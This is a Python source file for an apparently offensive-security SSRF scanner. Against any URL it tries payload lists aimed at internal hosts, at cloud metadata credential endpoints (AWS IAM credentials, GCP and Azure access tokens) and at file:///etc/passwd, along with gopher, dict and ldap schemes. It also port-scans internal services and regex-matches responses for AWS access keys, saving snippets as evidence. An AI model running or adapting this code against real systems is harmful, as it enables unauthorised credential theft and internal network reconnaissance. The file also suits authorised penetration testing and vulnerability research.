"""Deep SSRF detection — internal network, cloud metadata, OOB verification, protocol variations."""

import httpx
import re
import urllib.parse
import asyncio
import socket
import ipaddress
import html

# --- SSRF Parameters to Test ---
SSRF_PARAMS = [
    "url", "uri", "file", "dest", "redirect", "src", "load", "fetch",
    "path", "include", "page", "ref", "link", "goto", "next", "target",
    "image", "img", "avatar", "icon", "logo", "thumbnail", "photo",
    "feed", "xml", "json", "api", "callback", "webhook", "back",
    "return", "redirect_url", "redirect_uri", "continue", "rurl",
    "data", "document", "folder", "pdf", "template", "host",
    "site", "html", "text", "content", "resource", "location",
    "url_prefix", "domain", "proxy", "gateway", "server",
]

# --- Internal Network Targets ---
INTERNAL_TARGETS = [
    ("localhost", "127.0.0.1", "Localhost"),
    ("[::1]", "::1", "IPv6 localhost"),
    ("0.0.0.0", "0.0.0.0", "Wildcard"),
    ("10.0.0.1", "10.0.0.1", "Common gateway"),
    ("192.168.1.1", "192.168.1.1", "Common router"),
    ("192.168.0.1", "192.168.0.1", "Common router alt"),
    ("172.16.0.1", "172.16.0.1", "Docker gateway"),
    ("169.254.169.254", "169.254.169.254", "Cloud metadata"),
    ("metadata.google.internal", "metadata.google.internal", "GCP metadata"),
    ("instance-data", "169.254.169.254", "AWS metadata"),
]

# --- Cloud Metadata Endpoints ---
CLOUD_METADATA = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
}

# --- Protocol Variations ---
PROTOCOL_PAYLOADS = [
    ("http", "http://127.0.0.1:80"),
    ("https", "https://127.0.0.1:443"),
    ("file", "file:///etc/passwd"),
    ("file_win", "file:///c:/windows/win.ini"),
    ("gopher", "gopher://127.0.0.1:25/"),
    ("dict", "dict://127.0.0.1:6379/info"),
    ("ftp", "ftp://127.0.0.1:21/"),
    ("tftp", "tftp://127.0.0.1:69/test"),
    ("netdoc", "netdoc:///etc/passwd"),
    ("jar", "jar:http://127.0.0.1/!"),
    ("ldap", "ldap://127.0.0.1:389/"),
    ("netdoc_win", "netdoc:///c:/windows/win.ini"),
]

# --- Internal Services to Probe ---
INTERNAL_SERVICES = [
    ("127.0.0.1", 22, "SSH"),
    ("127.0.0.1", 25, "SMTP"),
    ("127.0.0.1", 53, "DNS"),
    ("127.0.0.1", 80, "HTTP"),
    ("127.0.0.1", 110, "POP3"),
    ("127.0.0.1", 143, "IMAP"),
    ("127.0.0.1", 443, "HTTPS"),
    ("127.0.0.1", 993, "IMAPS"),
    ("127.0.0.1", 995, "POP3S"),
    ("127.0.0.1", 3306, "MySQL"),
    ("127.0.0.1", 5432, "PostgreSQL"),
    ("127.0.0.1", 6379, "Redis"),
    ("127.0.0.1", 8080, "HTTP-Alt"),
    ("127.0.0.1", 8443, "HTTPS-Alt"),
    ("127.0.0.1", 9200, "Elasticsearch"),
    ("127.0.0.1", 9090, "Prometheus"),
    ("127.0.0.1", 27017, "MongoDB"),
    ("127.0.0.1", 6443, "K8s API"),
]


def _generate_callback_url(callback_domain: str) -> str:
    """Generate a unique callback URL for OOB verification."""
    import random
    import string
    unique_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return f"http://{unique_id}.{callback_domain}"


async def _check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
    """Check if a port is open."""
    try:
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout,
        )
        writer.close()
        await writer.wait_closed()
        return True
    except Exception:
        return False


def _response_content(response, payload, baseline, controls):
    """New successful content beyond baseline and a reflected injected URL.

    HTTP status, response size and URL echoes alone do not prove server fetching.
    Missing baseline remains inconclusive rather than positive evidence.
    """
    if response.status_code != 200 or baseline is None or response.text.strip() == baseline.strip():
        return ""
    body = response.text
    for token in (html.escape(payload), urllib.parse.quote(payload, safe=""), payload):
        body = body.replace(token, "")
    control_body = baseline
    for value in controls:
        for token in (html.escape(value), urllib.parse.quote(value, safe=""), value):
            if token:
                control_body = control_body.replace(token, "")
    return body if body.strip() != control_body.strip() else ""


async def ssrf_detect(target: str) -> dict:
    """Deep SSRF detection with internal network probing, cloud metadata, and protocol variations."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    test_params = list(params.keys()) if params else [
        "url", "uri", "file", "dest", "redirect", "src", "load", "fetch",
        "path", "page", "img", "image", "link", "next", "return",
    ]

    results = []
    open_services = []

    async with httpx.AsyncClient(
        timeout=20.0,
        follow_redirects=False,
        verify=False,
        limits=httpx.Limits(max_connections=50),
    ) as client:
        baseline = None
        try:
            baseline_response = await client.get(target)
            baseline = baseline_response.text
        except httpx.HTTPError:
            pass
        controls = [value for values in params.values() for value in values]
        # --- Basic SSRF Detection ---
        for p in test_params:
            for internal_ip, ip_addr, label in INTERNAL_TARGETS:
                try:
                    payload = f"http://{ip_addr}"
                    url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"

                    start_time = asyncio.get_event_loop().time()
                    resp = await client.get(url)
                    elapsed = asyncio.get_event_loop().time() - start_time

                    body = _response_content(resp, payload, baseline, controls)
                    body_len = len(body)

                    # Detect internal access indicators
                    indicators = []
                    if re.search(r"root:[^:\n]*:0:0:", body):
                        indicators.append("internal_content_leak")
                    if re.search(r"ami-[a-z0-9]+", body):
                        indicators.append("aws_ami_leak")
                    if re.search(r"instance-id", body):
                        indicators.append("instance_metadata")

                    # Port scan via SSRF
                    if internal_ip == "127.0.0.1":
                        for svc_ip, svc_port, svc_name in INTERNAL_SERVICES:
                            try:
                                svc_url = f"http://{svc_ip}:{svc_port}"
                                svc_test = f"{base}?{p}={urllib.parse.quote(svc_url, safe='')}"
                                svc_resp = await client.get(svc_test, timeout=5.0)
                                svc_body = _response_content(svc_resp, svc_url, baseline, controls)
                                if re.search(r"SSH-\d|redis_version:|^220[ -].*SMTP", svc_body, re.M | re.I):
                                    open_services.append({
                                        "service": svc_name,
                                        "port": svc_port,
                                        "status": svc_resp.status_code,
                                        "evidence": svc_resp.text[:100],
                                    })
                            except Exception:
                                pass

                    if indicators:
                        results.append({
                            "technique": "basic_ssrf",
                            "param": p,
                            "payload": payload,
                            "target_label": label,
                            "status": resp.status_code,
                            "response_size": body_len,
                            "elapsed": round(elapsed, 2),
                            "indicators": indicators,
                            "risk": "CRITICAL" if indicators else "HIGH",
                            "confidence": "high" if len(indicators) >= 2 else "medium",
                        })
                        break  # Found working parameter
                except Exception:
                    continue

        # --- Cloud Metadata SSRF ---
        for cloud, metadata_urls in CLOUD_METADATA.items():
            for p in test_params:
                for md_url in metadata_urls[:2]:  # Test top 2 per cloud
                    try:
                        url = f"{base}?{p}={urllib.parse.quote(md_url, safe='')}"
                        resp = await client.get(url, timeout=10.0)
                        body = _response_content(resp, md_url, baseline, controls)

                        # Check for cloud-specific content
                        cloud_indicators = []
                        if cloud == "aws":
                            if any(kw in body for kw in ["ami-id", "instance-id", "iam", "security-credentials"]):
                                cloud_indicators.append("aws_metadata_access")
                            if re.search(r"AKIA[0-9A-Z]{16}", body):
                                cloud_indicators.append("aws_access_key_exposed")
                        elif cloud == "gcp":
                            if any(kw in body for kw in ["access_token", "project-id", "instance"]):
                                cloud_indicators.append("gcp_metadata_access")
                        elif cloud == "azure":
                            if any(kw in body for kw in ["access_token", "compute", "network"]):
                                cloud_indicators.append("azure_metadata_access")

                        if cloud_indicators:
                            results.append({
                                "technique": "cloud_metadata_ssrf",
                                "param": p,
                                "cloud": cloud,
                                "metadata_url": md_url,
                                "status": resp.status_code,
                                "indicators": cloud_indicators,
                                "evidence": body[:200],
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            break
                    except Exception:
                        continue

        # --- Protocol Variation SSRF ---
        for p in test_params:
            for proto_name, proto_url in PROTOCOL_PAYLOADS:
                try:
                    url = f"{base}?{p}={urllib.parse.quote(proto_url, safe='')}"
                    resp = await client.get(url, timeout=10.0)
                    body = _response_content(resp, proto_url, baseline, controls)
                    body_len = len(body)

                    proto_indicators = []
                    if proto_name == "file" and ("root:" in body or "[extensions]" in body):
                        proto_indicators.append("file_read_confirmed")
                    elif proto_name == "file_win" and "[extensions]" in body:
                        proto_indicators.append("windows_file_read")
                    elif proto_name == "gopher" and re.search(r"^220[ -].*SMTP|redis_version:", body, re.M | re.I):
                        proto_indicators.append("gopher_reachable")
                    elif proto_name == "dict" and re.search(r"redis_version:|^\+PONG", body, re.M):
                        proto_indicators.append("dict_reachable")
                    elif proto_name == "ldap" and "namingContexts:" in body:
                        proto_indicators.append("ldap_reachable")

                    if proto_indicators:
                        results.append({
                            "technique": "protocol_variation",
                            "param": p,
                            "protocol": proto_name,
                            "payload": proto_url,
                            "status": resp.status_code,
                            "indicators": proto_indicators,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Blind SSRF via Timing ---
        timing_targets = [
            ("internal_timing", "http://127.0.0.1:1"),
            ("internal_closed", "http://127.0.0.1:80"),
            ("external_timing", "http://nonexistent.example.com"),
        ]

        for p in test_params[:3]:
            for label, timing_url in timing_targets:
                try:
                    start = asyncio.get_event_loop().time()
                    try:
                        resp = await client.get(
                            f"{base}?{p}={urllib.parse.quote(timing_url, safe='')}",
                            timeout=10.0,
                        )
                    except Exception:
                        pass
                    elapsed = asyncio.get_event_loop().time() - start

                    if elapsed > 4:
                        results.append({
                            "technique": "blind_ssrf_timing",
                            "param": p,
                            "payload": timing_url,
                            "target": label,
                            "elapsed": round(elapsed, 2),
                            "risk": "MEDIUM",
                            "confidence": "low",
                        })
                except Exception:
                    continue

        # --- Redirect-based SSRF ---
        redirect_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80",
            "file:///etc/passwd",
        ]

        for p in test_params:
            for redir_url in redirect_payloads:
                try:
                    # Test if server follows redirect to internal
                    url = f"{base}?{p}={urllib.parse.quote(redir_url, safe='')}"
                    resp = await client.get(url, timeout=10.0, follow_redirects=True)

                    if str(resp.url) != str(url) and resp.status_code == 200:
                        body = _response_content(resp, redir_url, baseline, controls)
                        if "root:" in body or "ami-" in body or "meta-data" in body:
                            results.append({
                                "technique": "redirect_ssrf",
                                "param": p,
                                "payload": redir_url,
                                "redirected_to": str(resp.url),
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            break
                except Exception:
                    continue

    return {
        "target": target,
        "params_tested": test_params,
        "open_services": open_services,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
            "low": sum(1 for r in results if r.get("risk") == "LOW"),
        },
    }
